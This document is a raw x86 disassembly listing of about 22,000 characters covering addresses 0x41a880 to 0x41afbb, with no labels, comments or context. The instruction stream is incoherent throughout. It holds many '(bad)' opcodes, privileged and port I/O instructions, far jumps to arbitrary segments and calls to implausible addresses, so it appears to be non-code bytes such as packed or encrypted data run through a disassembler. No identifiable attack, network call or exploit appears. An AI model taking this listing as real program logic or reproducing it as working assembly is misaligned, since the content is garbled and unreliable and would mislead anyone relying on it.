  41a880:	or     ebx,DWORD PTR [edi*8+0x7998e08d]
  41a887:	or     eax,0x2f014542
  41a88c:	xchg   ebx,eax
  41a88d:	cmp    esi,ebp
  41a88f:	les    ebp,FWORD PTR [eax]
  41a891:	adc    al,0x9e
  41a893:	mov    ebp,0x4b8f437f
  41a898:	ffreep st(6)
  41a89a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a89b:	lea    ecx,[edi-0x6e]
  41a89e:	outs   dx,BYTE PTR ds:[esi]
  41a89f:	test   eax,0xe120d31f
  41a8a4:	bound  edi,QWORD PTR [esi]
  41a8a6:	shr    DWORD PTR [edx+0x3bfe7f61],0x95
  41a8ad:	daa    
  41a8ae:	inc    edi
  41a8af:	imul   ebx,DWORD PTR [esi],0x982f5580
  41a8b5:	call   0xa0300253
  41a8ba:	fldenv [ebx+0x383b86b4]
  41a8c0:	jae    0x41a8cf
  41a8c2:	retf   0x8232
  41a8c5:	imul   ebp,DWORD PTR [edi],0x5d138226
  41a8cb:	sti    
  41a8cc:	mov    ebx,0x63364e05
  41a8d1:	retf   0x386f
  41a8d4:	fild   QWORD PTR [esi]
  41a8d7:	inc    eax
  41a8d8:	jecxz  0x41a892
  41a8da:	xchg   esp,eax
  41a8db:	(bad)  
  41a8dc:	std    
  41a8dd:	sbb    ch,bl
  41a8df:	and    ebp,esi
  41a8e1:	adc    eax,0x3752605f
  41a8e6:	jb     0x41a8bc
  41a8e8:	mov    ebx,0x54951880
  41a8ed:	xchg   esi,eax
  41a8ee:	add    dh,BYTE PTR [eax+edi*8]
  41a8f1:	scas   eax,DWORD PTR es:[edi]
  41a8f2:	fimul  DWORD PTR [eax+esi*4-0x4b6b27bf]
  41a8f9:	sbb    ch,BYTE PTR [edi+0x54d080c8]
  41a8ff:	je     0x41a940
  41a901:	stos   DWORD PTR es:[edi],eax
  41a902:	(bad)  
  41a903:	div    BYTE PTR [edx+0x63]
  41a906:	test   al,0xb4
  41a908:	mov    WORD PTR [esi-0x50e5ebe],fs
  41a90e:	in     eax,dx
  41a90f:	test   DWORD PTR [si],ecx
  41a912:	int    0xe5
  41a914:	xor    dh,BYTE PTR [ebp-0x4c]
  41a917:	ins    DWORD PTR es:[edi],dx
  41a918:	ror    BYTE PTR [ebx-0x4d],cl
  41a91b:	(bad)  
  41a91c:	fiadd  WORD PTR [esp+esi*8+0x46370d95]
  41a923:	push   edi
  41a924:	jae    0x41a8b1
  41a926:	js     0x41a944
  41a928:	retf   
  41a929:	ret    
  41a92a:	and    edi,DWORD PTR [ebx+eiz*8]
  41a92d:	adc    DWORD PTR [edx],esp
  41a92f:	fsubr  QWORD PTR [edx+0xf]
  41a932:	loopne 0x41a90c
  41a934:	jnp    0x41a973
  41a936:	gs aaa 
  41a938:	push   esi
  41a939:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a93a:	fmul   QWORD PTR [edx-0xf]
  41a93d:	out    dx,eax
  41a93e:	mov    esp,0x7feafeef
  41a943:	xchg   ebp,eax
  41a944:	sub    BYTE PTR [ebx+0x10],0x5a
  41a948:	or     al,0x1a
  41a94a:	dec    edx
  41a94b:	adc    BYTE PTR [edx],ch
  41a94d:	or     ebx,DWORD PTR cs:[ebx+0x21eef021]
  41a954:	out    dx,eax
  41a955:	or     eax,esp
  41a957:	xchg   edi,eax
  41a958:	or     BYTE PTR [esi+0x362318f6],dl
  41a95e:	aad    0xf8
  41a960:	add    bh,BYTE PTR [eax+0x39]
  41a963:	jmp    0xf024:0x7010a8bb
  41a96a:	xchg   ecx,eax
  41a96b:	jns    0x41a97b
  41a96d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a96e:	adc    al,0x29
  41a970:	es jp  0x41a94e
  41a973:	add    al,BYTE PTR [edi-0x16d06dce]
  41a979:	gs dec eax
  41a97b:	dec    esi
  41a97c:	nop
  41a97d:	sbb    ah,ah
  41a97f:	xor    edi,DWORD PTR ds:[edx]
  41a982:	dec    BYTE PTR [eax+0x69c967b0]
  41a988:	scas   eax,DWORD PTR es:[edi]
  41a989:	(bad)  [ecx]
  41a98b:	add    al,0x9f
  41a98d:	pusha  
  41a98e:	and    DWORD PTR [ecx],edx
  41a990:	dec    edi
  41a991:	pop    ds
  41a992:	ins    BYTE PTR es:[edi],dx
  41a993:	aad    0x53
  41a995:	mov    ch,0xe0
  41a997:	shl    DWORD PTR [eax+0x492c0cf0],1
  41a99d:	shr    DWORD PTR [ebx+edi*1-0x4e9b24dc],0xa2
  41a9a5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a9a6:	add    BYTE PTR [ebx-0xf],0x37
  41a9aa:	dec    edi
  41a9ab:	retf   0x7ca8
  41a9ae:	sti    
  41a9af:	bound  edx,QWORD PTR [ebx]
  41a9b1:	into   
  41a9b2:	fild   WORD PTR [eax]
  41a9b4:	or     al,0x92
  41a9b6:	gs (bad) 
  41a9b8:	imul   esp,edx,0x89c18ad9
  41a9be:	and    eax,0xb40846e
  41a9c3:	out    0x3d,eax
  41a9c5:	cmp    DWORD PTR [edi+0x4e],0x18
  41a9c9:	dec    eax
  41a9ca:	ins    DWORD PTR es:[edi],dx
  41a9cb:	stos   BYTE PTR es:[edi],al
  41a9cc:	dec    ecx
  41a9cd:	scas   al,BYTE PTR es:[edi]
  41a9ce:	int    0xf2
  41a9d0:	(bad)  
  41a9d1:	je     0x41a961
  41a9d3:	(bad)  
  41a9d4:	stc    
  41a9d5:	push   0x957996a
  41a9da:	(bad)  
  41a9db:	mov    edi,0xade25ef2
  41a9e0:	(bad)  
  41a9e1:	out    dx,al
  41a9e2:	add    BYTE PTR [ecx+edi*4],0x31
  41a9e6:	stc    
  41a9e7:	adc    BYTE PTR [edi+0x5d],bl
  41a9ea:	adc    DWORD PTR [edi-0x52c70c32],0x41
  41a9f1:	ins    BYTE PTR es:[edi],dx
  41a9f2:	pop    edx
  41a9f3:	ficomp WORD PTR [esi]
  41a9f5:	lds    ebx,FWORD PTR [edx-0x35311a2c]
  41a9fb:	xor    eax,0x970303d3
  41aa00:	inc    ecx
  41aa01:	adc    ebx,DWORD PTR [esi-0x35c237c9]
  41aa07:	xor    DWORD PTR [ebx-0x7e87f137],edi
  41aa0d:	sbb    ebp,DWORD PTR [edx+edx*8]
  41aa10:	and    bl,BYTE PTR [edi]
  41aa12:	dec    edx
  41aa13:	xor    ch,BYTE PTR [ecx+0x4957f633]
  41aa19:	jle    0x41aa97
  41aa1b:	xor    BYTE PTR [edi],ch
  41aa1d:	dec    ebp
  41aa1e:	pushf  
  41aa1f:	shr    DWORD PTR [esi+0xf],0x11
  41aa23:	pop    edi
  41aa24:	sbb    BYTE PTR [edx],al
  41aa26:	mov    dl,0x92
  41aa28:	adc    ch,dl
  41aa2a:	inc    esi
  41aa2b:	in     eax,dx
  41aa2c:	fcmovnb st,st(2)
  41aa2e:	pop    ecx
  41aa2f:	sbb    DWORD PTR [ecx-0x1a],0xfffffff0
  41aa33:	push   0xffffffac
  41aa35:	popf   
  41aa36:	pop    edx
  41aa37:	jbe    0x41aaa3
  41aa39:	jg     0x41aa51
  41aa3b:	sub    dl,BYTE PTR [edi+ebp*4-0x79]
  41aa3f:	pop    edi
  41aa40:	lock xchg edi,eax
  41aa42:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41aa43:	jnp    0x41aa33
  41aa45:	jmp    0x2543:0xfa7fa486
  41aa4c:	into   
  41aa4d:	sub    DWORD PTR ds:0x779823b9,eax
  41aa53:	cmp    eax,0x82cbb7e5
  41aa58:	stc    
  41aa59:	in     eax,dx
  41aa5a:	push   es
  41aa5b:	das    
  41aa5c:	das    
  41aa5d:	cmp    ebp,edi
  41aa5f:	sbb    bh,BYTE PTR [edx]
  41aa61:	ret    
  41aa62:	inc    esi
  41aa63:	ror    DWORD PTR [eax+0x65],1
  41aa66:	xor    bl,BYTE PTR [edx+0x56]
  41aa69:	xor    DWORD PTR [ebx],edx
  41aa6b:	dec    eax
  41aa6c:	enter  0x1f75,0xd4
  41aa70:	rcr    bl,cl
  41aa72:	retf   0x8427
  41aa75:	fs push ebx
  41aa77:	mov    al,0x4d
  41aa79:	push   ecx
  41aa7a:	bound  esp,QWORD PTR [edx]
  41aa7c:	dec    edi
  41aa7d:	es cwde 
  41aa7f:	pusha  
  41aa80:	inc    ebx
  41aa81:	aas    
  41aa82:	in     eax,0x4c
  41aa84:	lods   al,BYTE PTR ds:[esi]
  41aa85:	clc    
  41aa86:	fadd   QWORD PTR [edi-0x2a]
  41aa89:	jns    0x41aa54
  41aa8b:	dec    edx
  41aa8c:	adc    eax,0x78c22d09
  41aa91:	ss (bad) 
  41aa93:	xlat   BYTE PTR ds:[ebx]
  41aa94:	std    
  41aa95:	iret   
  41aa96:	pop    ecx
  41aa97:	sbb    eax,0x1d3950f6
  41aa9c:	call   0xac316741
  41aaa1:	mov    al,0x2f
  41aaa3:	(bad)  
  41aaa4:	retf   0x2849
  41aaa7:	fiadd  DWORD PTR [ecx+edx*1-0x542a410f]
  41aaae:	ret    
  41aaaf:	jb     0x41aa43
  41aab1:	and    eax,0x1f5d89be
  41aab6:	jns    0x41aa81
  41aab8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aab9:	add    DWORD PTR ss:[ebx],ebp
  41aabc:	add    edx,edx
  41aabe:	jl     0x41aa58
  41aac0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41aac1:	sahf   
  41aac2:	out    dx,eax
  41aac3:	and    DWORD PTR [eax+eax*4],0xc9fc346a
  41aaca:	ins    DWORD PTR es:[edi],dx
  41aacb:	mov    ecx,0x42c5b798
  41aad0:	jns    0x41aa95
  41aad2:	mov    edx,0xffef1d40
  41aad7:	adc    esp,DWORD PTR [esi-0xc6dcea4]
  41aadd:	mov    bh,0xd8
  41aadf:	jmp    0x41aa64
  41aae1:	cld    
  41aae2:	xor    BYTE PTR [ebp+0x5f],cl
  41aae5:	sbb    DWORD PTR [edi],ecx
  41aae7:	jp     0x41ab63
  41aae9:	outs   dx,BYTE PTR ds:[esi]
  41aaea:	out    dx,eax
  41aaeb:	push   ebp
  41aaec:	ins    DWORD PTR es:[edi],dx
  41aaed:	pop    ebp
  41aaee:	cmp    cl,BYTE PTR es:[edi+eiz*2+0xe6c71]
  41aaf6:	sub    eax,0x82d1d59b
  41aafb:	icebp  
  41aafc:	mov    edi,0x3c95ec8a
  41ab01:	clc    
  41ab02:	loopne 0x41ab3a
  41ab04:	shr    DWORD PTR [edi-0x55],0xc0
  41ab08:	mov    edx,0xcf01af54
  41ab0d:	jp     0x41aae4
  41ab0f:	aaa    
  41ab10:	sbb    BYTE PTR [edi],al
  41ab12:	mov    eax,0x74d444e8
  41ab17:	in     al,dx
  41ab18:	inc    esi
  41ab19:	mov    cl,0x73
  41ab1b:	inc    ecx
  41ab1c:	inc    esi
  41ab1d:	test   BYTE PTR [ebp-0xb],dl
  41ab20:	(bad)  
  41ab21:	std    
  41ab22:	push   ds
  41ab23:	out    dx,al
  41ab24:	nop
  41ab25:	icebp  
  41ab26:	fsub   DWORD PTR [ebp+0x6943b2b0]
  41ab2c:	push   esp
  41ab2d:	adc    DWORD PTR [eax+ebx*4],eax
  41ab30:	sub    al,0xc4
  41ab32:	retf   
  41ab33:	pop    esp
  41ab34:	dec    ebp
  41ab35:	std    
  41ab36:	inc    edi
  41ab37:	pop    edi
  41ab38:	mov    dl,0xa3
  41ab3a:	sbb    dh,BYTE PTR [ecx]
  41ab3c:	ror    DWORD PTR [edx-0x2e51f131],0x4f
  41ab43:	fistp  DWORD PTR [esi+0x1e7cfdae]
  41ab49:	retf   
  41ab4a:	push   eax
  41ab4b:	jp     0x41ab4c
  41ab4d:	in     al,0x3b
  41ab4f:	sub    al,0xc6
  41ab51:	sar    ecx,cl
  41ab53:	mov    cl,0x4d
  41ab55:	cmp    BYTE PTR [esi+0x388b8e0c],dh
  41ab5b:	ret    0xa522
  41ab5e:	and    ebx,DWORD PTR [ebx+0x1a0736c2]
  41ab64:	adc    ch,BYTE PTR [ebp+0x52]
  41ab67:	syscall 
  41ab69:	push   eax
  41ab6a:	xchg   esp,eax
  41ab6b:	add    ecx,DWORD PTR [edi+0x61491a55]
  41ab71:	pop    eax
  41ab72:	jb     0x41aaf6
  41ab74:	es loop 0x41abcb
  41ab77:	repz shl DWORD PTR [eax+0x641bec58],1
  41ab7e:	jmp    0x41ab68
  41ab80:	push   es
  41ab81:	inc    ebx
  41ab82:	push   es
  41ab83:	ficomp WORD PTR [edx]
  41ab85:	jge    0x41ab4a
  41ab87:	xchg   ebp,esi
  41ab89:	xor    esp,DWORD PTR [ebp-0x66]
  41ab8c:	hlt    
  41ab8d:	xchg   esi,eax
  41ab8e:	iret   
  41ab8f:	jno    0x41ab46
  41ab91:	pop    esi
  41ab92:	daa    
  41ab93:	add    ah,BYTE PTR [edi-0x22a39a94]
  41ab99:	xchg   esp,eax
  41ab9a:	pop    ds
  41ab9b:	and    DWORD PTR [ebx-0x257a4885],eax
  41aba1:	push   0x22
  41aba3:	imul   edi,DWORD PTR [edi-0x5e01462],0xffffff83
  41abaa:	(bad)  
  41abab:	int    0x57
  41abad:	lea    ecx,[edx+0x3]
  41abb0:	movntps XMMWORD PTR [esi],xmm5
  41abb3:	pop    eax
  41abb4:	jnp    0x41ab80
  41abb6:	inc    esi
  41abb7:	mul    DWORD PTR [ebx-0x1bf71a15]
  41abbd:	and    DWORD PTR [ebp-0x68],esp
  41abc0:	inc    eax
  41abc1:	push   ebp
  41abc2:	xor    al,0xb7
  41abc4:	mov    esp,0x374135d5
  41abc9:	ins    BYTE PTR es:[edi],dx
  41abca:	lds    eax,FWORD PTR [edi-0x57ad2f5e]
  41abd0:	outs   dx,BYTE PTR ds:[esi]
  41abd1:	rcl    BYTE PTR [edi+eiz*2],1
  41abd4:	(bad)  
  41abd5:	xacquire xchg BYTE PTR [ebp-0xa],bl
  41abd9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41abda:	(bad)  
  41abdb:	sbb    BYTE PTR [ecx-0x53],dh
  41abde:	sbb    al,BYTE PTR [edi+0x2b7abd44]
  41abe4:	and    BYTE PTR [esi-0x37],0xc
  41abe8:	pop    ds
  41abe9:	mov    DWORD PTR ds:0x5f9cc9c4,edi
  41abef:	push   0x91ca2f80
  41abf4:	pop    ds
  41abf5:	test   eax,0x92b42b86
  41abfa:	dec    ebx
  41abfb:	inc    ebp
  41abfc:	imul   eax,ecx,0xffffff82
  41abff:	mov    al,0xef
  41ac01:	adc    al,BYTE PTR [ecx]
  41ac03:	adc    al,0xad
  41ac05:	scas   eax,DWORD PTR es:[edi]
  41ac06:	outs   dx,DWORD PTR ds:[esi]
  41ac07:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ac08:	and    eax,0x27457def
  41ac0d:	mov    eax,ds:0x58be4e32
  41ac12:	sub    ah,ah
  41ac14:	mov    cs,WORD PTR [edi-0x4a]
  41ac17:	int    0xe1
  41ac19:	or     al,0x2a
  41ac1b:	int    0x13
  41ac1d:	and    ebp,DWORD PTR [edx]
  41ac1f:	jmp    0x866f144b
  41ac24:	mov    edx,0x6f352a19
  41ac29:	add    edi,DWORD PTR [esi]
  41ac2b:	mov    edi,0x5c33894b
  41ac30:	mov    ecx,0x689747b9
  41ac35:	jecxz  0x41abe5
  41ac37:	outs   dx,DWORD PTR ds:[esi]
  41ac38:	jnp    0x41abcb
  41ac3a:	pop    ebp
  41ac3b:	mov    esi,0xe6c6dbf9
  41ac40:	call   0xe291d626
  41ac45:	fld    DWORD PTR [eax]
  41ac47:	adc    al,0x98
  41ac49:	(bad)
  41ac4c:	outs   dx,BYTE PTR ds:[esi]
  41ac4d:	xchg   edx,eax
  41ac4e:	jo     0x41ac80
  41ac50:	xor    BYTE PTR fs:[eax+0x793cf13],bh
  41ac57:	pop    ecx
  41ac58:	sub    ah,BYTE PTR [ebx+0x3a95d6c2]
  41ac5e:	dec    ebp
  41ac5f:	push   edx
  41ac60:	rcr    BYTE PTR [ecx-0x59],0x25
  41ac64:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ac66:	dec    ebx
  41ac67:	popf   
  41ac68:	mov    BYTE PTR [ebx-0x68],al
  41ac6b:	cmp    edx,DWORD PTR [eax-0x8]
  41ac6e:	or     eax,0xb4bb87bf
  41ac73:	pop    DWORD PTR [esi-0x106041a6]
  41ac79:	mov    esi,DWORD PTR [eax+0x27]
  41ac7c:	xchg   edx,eax
  41ac7d:	xor    eax,0x925eb7dd
  41ac82:	iret   
  41ac83:	jmp    0xaf427f2a
  41ac88:	push   esi
  41ac89:	and    DWORD PTR [ebx],edi
  41ac8b:	cmp    eax,0xf0e64eea
  41ac90:	repnz int 0xcb
  41ac93:	push   edx
  41ac94:	xor    DWORD PTR [eax+ebp*4+0x19],ebp
  41ac98:	outs   dx,DWORD PTR ds:[esi]
  41ac99:	out    dx,eax
  41ac9a:	sbb    cl,dh
  41ac9c:	mov    ah,0x16
  41ac9e:	or     BYTE PTR [edx+0x30],ch
  41aca1:	add    eax,0xe39d8a56
  41aca6:	mov    ecx,0xc3db4e5f
  41acab:	imul   ebp,DWORD PTR [edx],0xfffffff3
  41acae:	inc    ebx
  41acaf:	dec    edx
  41acb0:	test   al,0x4c
  41acb2:	fild   DWORD PTR [ebp+0x16]
  41acb5:	clc    
  41acb6:	jle    0x41ac68
  41acb8:	dec    eax
  41acb9:	ins    BYTE PTR es:[edi],dx
  41acba:	mov    dh,0xdf
  41acbc:	mov    ah,dh
  41acbe:	jae    0x41ad2a
  41acc0:	add    cl,BYTE PTR [ecx-0x36fafc4f]
  41acc6:	retf   0x8460
  41acc9:	cld    
  41acca:	loope  0x41ad30
  41accc:	mov    eax,0xb24a64b1
  41acd1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41acd2:	add    ch,BYTE PTR ds:0x477f8691
  41acd8:	mov    ebp,0xd98856b
  41acdd:	jnp    0x41ac60
  41acdf:	sub    ebp,DWORD PTR [edx-0x77b0302f]
  41ace5:	loope  0x41accd
  41ace7:	fs mov cl,0xd2
  41acea:	mov    ecx,0xb65dfc6
  41acef:	out    dx,al
  41acf0:	sar    DWORD PTR [ecx],cl
  41acf2:	sub    al,0x8e
  41acf4:	fdiv   QWORD PTR [eax+0x4b6d8ca1]
  41acfa:	xchg   ebx,eax
  41acfb:	mov    dl,0x39
  41acfd:	test   eax,0x1f66a43c
  41ad02:	std    
  41ad03:	add    bl,BYTE PTR [eax-0x75]
  41ad06:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ad07:	mov    bh,0xf9
  41ad09:	in     eax,0x6c
  41ad0b:	sub    al,BYTE PTR [eax+0x58]
  41ad0e:	xchg   ebx,eax
  41ad0f:	add    BYTE PTR [esi],0xc8
  41ad12:	sbb    BYTE PTR fs:[edx],bh
  41ad15:	sub    bl,BYTE PTR [edx]
  41ad17:	into   
  41ad18:	fild   QWORD PTR [esi-0x62a5187c]
  41ad1e:	data16 sub BYTE PTR [eax],al
  41ad21:	jg     0x41ace8
  41ad23:	in     al,0x34
  41ad25:	mov    dh,0x6f
  41ad27:	mov    ds:0x12112df0,al
  41ad2c:	xchg   DWORD PTR [eax],ebp
  41ad2e:	adc    eax,0x7757ee18
  41ad33:	lea    edx,es:[ecx+0x33]
  41ad37:	(bad)  [esi]
  41ad39:	rcr    DWORD PTR [ebp+eiz*8+0x3],1
  41ad3d:	add    DWORD PTR [edx-0x75c965db],esp
  41ad43:	das    
  41ad44:	push   esi
  41ad45:	jmp    0x41acde
  41ad47:	mov    fs,WORD PTR [edi+0x5b5b7f4c]
  41ad4d:	ja     0x41ad6a
  41ad4f:	out    dx,al
  41ad50:	dec    edi
  41ad51:	jg     0x41adbb
  41ad53:	(bad)  
  41ad55:	ficomp DWORD PTR [ebx+ecx*2+0x5acff7e7]
  41ad5c:	push   0x74
  41ad5e:	push   0xcb7e349a
  41ad63:	xor    DWORD PTR [eax+ecx*8-0x20ecd6f4],0xffffff9a
  41ad6b:	das    
  41ad6c:	in     al,dx
  41ad6d:	dec    ecx
  41ad6e:	ret    
  41ad6f:	push   edx
  41ad70:	pusha  
  41ad71:	jge    0x41ad42
  41ad73:	adc    DWORD PTR [eax+0x45724d87],esi
  41ad79:	adc    ch,dh
  41ad7b:	cmp    al,0x24
  41ad7d:	push   edx
  41ad7e:	or     ebx,DWORD PTR [edx-0x376f6c86]
  41ad84:	fidivr WORD PTR [ecx+0x17]
  41ad87:	and    DWORD PTR [ecx+0x14],esp
  41ad8a:	imul   edx,eax,0x11
  41ad8d:	jb     0x41ad35
  41ad8f:	outs   dx,DWORD PTR ds:[esi]
  41ad90:	sbb    bl,0xe7
  41ad93:	cmp    ch,cl
  41ad95:	stos   DWORD PTR es:[edi],eax
  41ad96:	xchg   DWORD PTR fs:[ecx-0x4a],ebp
  41ad9a:	inc    ebp
  41ad9b:	test   DWORD PTR [ebp+0x68],ebx
  41ad9e:	inc    ebx
  41ad9f:	shl    cl,0xf1
  41ada2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ada3:	aaa    
  41ada4:	inc    edx
  41ada5:	add    al,0xe3
  41ada7:	popf   
  41ada8:	sub    al,0x90
  41adaa:	sub    eax,0x47f1863d
  41adaf:	ja     0x41adba
  41adb1:	pop    eax
  41adb2:	add    eax,0xa2b71585
  41adb7:	add    al,0x7d
  41adb9:	imul   edi,DWORD PTR gs:[ebp+0x9a68b1e],0x9d5f39e0
  41adc4:	scas   al,BYTE PTR es:[edi]
  41adc5:	nop
  41adc6:	add    BYTE PTR [ecx+0x3f],dl
  41adc9:	imul   esp,DWORD PTR [ebp+0x2],0x10
  41adcd:	hlt    
  41adce:	gs pusha 
  41add0:	inc    edx
  41add1:	jne    0x41ad6f
  41add3:	jmp    0x87be:0x33ab56bb
  41adda:	adc    bh,bl
  41addc:	sbb    eax,0x19571de1
  41ade1:	ins    BYTE PTR es:[edi],dx
  41ade2:	test   al,0xbc
  41ade4:	and    dh,bh
  41ade6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ade7:	hlt    
  41ade8:	sub    DWORD PTR [edx-0x1f9a763a],edi
  41adee:	fst    DWORD PTR [eax+0x70]
  41adf1:	dec    esi
  41adf2:	pop    edx
  41adf3:	add    eax,DWORD PTR [esp+eax*4]
  41adf6:	dec    edi
  41adf7:	push   esp
  41adf8:	cmp    eax,0x1201bb69
  41adfd:	add    eax,0xc00c859a
  41ae02:	imul   edi,DWORD PTR [ebp-0x5b],0x38cf9178
  41ae09:	test   BYTE PTR [ebx+0x5e],bl
  41ae0c:	sub    dh,BYTE PTR ss:[edx]
  41ae0f:	cmp    BYTE PTR [edi-0x382ea93],ch
  41ae15:	and    ch,BYTE PTR [esi]
  41ae17:	aas    
  41ae18:	or     al,0x74
  41ae1a:	xchg   esi,eax
  41ae1b:	mov    ebx,0x6032b695
  41ae20:	pusha  
  41ae21:	pop    edx
  41ae22:	out    0xf4,al
  41ae24:	cmp    al,0x5d
  41ae26:	and    bh,dl
  41ae28:	imul   esi,DWORD PTR [ebx-0x228b1295],0x2d
  41ae2f:	cmp    al,BYTE PTR [eax-0x15]
  41ae32:	push   cs
  41ae33:	push   edi
  41ae34:	fcomp  DWORD PTR [edi]
  41ae36:	push   ss
  41ae37:	dec    eax
  41ae38:	dec    edx
  41ae39:	jecxz  0x41ae3c
  41ae3b:	cld    
  41ae3c:	mov    cl,0x7d
  41ae3e:	ins    DWORD PTR es:[edi],dx
  41ae3f:	ror    BYTE PTR [edi+0x50],0xbe
  41ae43:	fcom   QWORD PTR [eax+0x32e1cb40]
  41ae49:	ror    DWORD PTR ds:0xb208b29e,0x55
  41ae50:	ret    
  41ae51:	icebp  
  41ae52:	pop    ebp
  41ae53:	retf   0x26c0
  41ae56:	jg     0x41aebb
  41ae58:	fnsave [ebx]
  41ae5a:	or     DWORD PTR [eax+0x2e],0x5c54043a
  41ae61:	or     DWORD PTR [esi-0x28],eax
  41ae64:	mov    edi,0x99deb8a2
  41ae69:	push   ebp
  41ae6a:	ja     0x41ae65
  41ae6c:	lds    esp,FWORD PTR [esi]
  41ae6e:	jnp    0x41aec2
  41ae70:	xchg   esp,eax
  41ae71:	pop    edi
  41ae72:	and    eax,0x95641da5
  41ae77:	imul   esi,DWORD PTR [ebx-0x476a9c62],0x48aa9566
  41ae81:	xchg   esi,eax
  41ae82:	out    0xf7,eax
  41ae84:	dec    eax
  41ae85:	sbb    DWORD PTR [edx+0x63],0xffffff8e
  41ae89:	loop   0x41ae61
  41ae8b:	mov    ecx,0xe3364b8e
  41ae90:	cmp    DWORD PTR [ecx],0xffffffce
  41ae93:	lock sahf 
  41ae95:	pop    esp
  41ae96:	outs   dx,BYTE PTR ds:[esi]
  41ae97:	je     0x41ae89
  41ae99:	push   ss
  41ae9a:	lods   al,BYTE PTR ds:[esi]
  41ae9b:	mov    al,ds:0x93f2d80e
  41aea0:	(bad)  
  41aea1:	push   eax
  41aea2:	ss div esp
  41aea5:	jns    0x41af06
  41aea7:	inc    ecx
  41aea8:	aas    
  41aea9:	or     ebx,ebx
  41aeab:	fsubr  st(1),st
  41aead:	add    al,0xe
  41aeaf:	mov    fs,WORD PTR [eax+0x45]
  41aeb2:	rcl    DWORD PTR [ecx],cl
  41aeb4:	lods   eax,DWORD PTR ds:[esi]
  41aeb5:	dec    edi
  41aeb6:	mov    eax,0xf222e485
  41aebb:	shr    DWORD PTR [ecx],1
  41aebd:	jbe    0x41af24
  41aebf:	inc    edx
  41aec0:	lahf   
  41aec1:	popf   
  41aec2:	jp     0x41aee3
  41aec4:	push   ebx
  41aec5:	adc    cl,bh
  41aec7:	push   0x59
  41aec9:	hlt    
  41aeca:	push   0xffffffb5
  41aecc:	leave  
  41aecd:	add    BYTE PTR [eax+0x72],0x76
  41aed1:	inc    sp
  41aed3:	gs mov edi,0xd8344be1
  41aed9:	outs   dx,BYTE PTR ds:[esi]
  41aeda:	test   al,0xa7
  41aedc:	cs mov ebp,0x14af097c
  41aee2:	inc    edx
  41aee3:	and    eax,0xa319448e
  41aee8:	push   cs
  41aee9:	add    DWORD PTR [ebx+0x2],edi
  41aeec:	mov    esi,DWORD PTR [edx+0x1ebdc2b6]
  41aef2:	jo     0x41aee2
  41aef4:	call   0x725a:0x23d739bb
  41aefb:	dec    bx
  41aefd:	inc    ecx
  41aefe:	adc    DWORD PTR [eax-0x25],eax
  41af01:	or     eax,0x872508b7
  41af06:	leave  
  41af07:	mov    ah,0x50
  41af09:	inc    esp
  41af0a:	and    DWORD PTR [edi],ebp
  41af0c:	adc    DWORD PTR [esi],edx
  41af0e:	jle    0x41aecd
  41af10:	stc    
  41af11:	lahf   
  41af12:	stos   BYTE PTR es:[edi],al
  41af13:	inc    ebp
  41af14:	pop    edx
  41af15:	pop    esi
  41af16:	ror    esi,1
  41af18:	fwait
  41af19:	add    BYTE PTR [esi],dh
  41af1b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41af1c:	xor    cl,BYTE PTR [ecx+edi*1+0x4ab95578]
  41af23:	xchg   edx,eax
  41af24:	sub    BYTE PTR gs:[ebx-0x7f],dh
  41af28:	xor    cl,ah
  41af2a:	idiv   BYTE PTR [eax-0x32]
  41af2d:	xor    DWORD PTR [eax*8+0x4795709c],eax
  41af34:	add    BYTE PTR [edx],ah
  41af36:	xor    ebp,ebx
  41af38:	mov    bl,0xfa
  41af3a:	add    DWORD PTR [ebx],eax
  41af3c:	int    0x6f
  41af3e:	call   0x2a0d4582
  41af43:	std    
  41af44:	stc    
  41af45:	das    
  41af46:	cmc    
  41af47:	pusha  
  41af48:	lods   eax,DWORD PTR ds:[esi]
  41af49:	stc    
  41af4a:	das    
  41af4b:	clc    
  41af4c:	mov    ds:0xa456674f,eax
  41af51:	iret   
  41af52:	cli    
  41af53:	(bad)  
  41af54:	xor    ecx,DWORD PTR [eax-0x713f1151]
  41af5a:	daa    
  41af5b:	inc    ebx
  41af5c:	inc    ebp
  41af5d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41af5e:	lahf   
  41af5f:	jne    0x41afde
  41af61:	add    esp,esp
  41af63:	ret    
  41af64:	xor    eax,edi
  41af66:	stos   DWORD PTR es:[edi],eax
  41af67:	call   DWORD PTR [edi+eax*4-0x7e4f1f74]
  41af6e:	(bad)  [edi-0x3cfd71c9]
  41af74:	cli    
  41af75:	add    al,0x29
  41af77:	pop    edx
  41af78:	cli    
  41af79:	test   eax,0xbba1fc7f
  41af7e:	or     al,0x2e
  41af80:	jge    0x41af28
  41af82:	and    ah,BYTE PTR [ebx+0x2a]
  41af85:	adc    bl,BYTE PTR [ecx-0x75c2b800]
  41af8b:	test   BYTE PTR [ecx],0x9b
  41af8e:	push   ss
  41af8f:	inc    ecx
  41af90:	sub    BYTE PTR [esi],ch
  41af92:	jecxz  0x41af15
  41af94:	sti    
  41af95:	in     al,0xff
  41af97:	and    ebp,DWORD PTR [ecx+0x6ba60969]
  41af9d:	ins    BYTE PTR es:[edi],dx
  41af9e:	or     BYTE PTR [edx],bl
  41afa0:	loopne 0x41b013
  41afa2:	test   BYTE PTR [edx-0x51],dh
  41afa5:	pusha  
  41afa6:	inc    eax
  41afa7:	or     ch,BYTE PTR [ecx+0x7b]
  41afaa:	cmp    eax,esi
  41afac:	xor    dl,BYTE PTR [ebp+0x1a8672]
  41afb2:	das    
  41afb3:	popa   
  41afb4:	leave  
  41afb5:	mov    al,0x67
  41afb7:	or     al,al
  41afb9:	dec    ecx
  41afba:	push   ebp
  41afbb:	test   DWORD PTR ds:0xe2e862df,0x2cce16bd
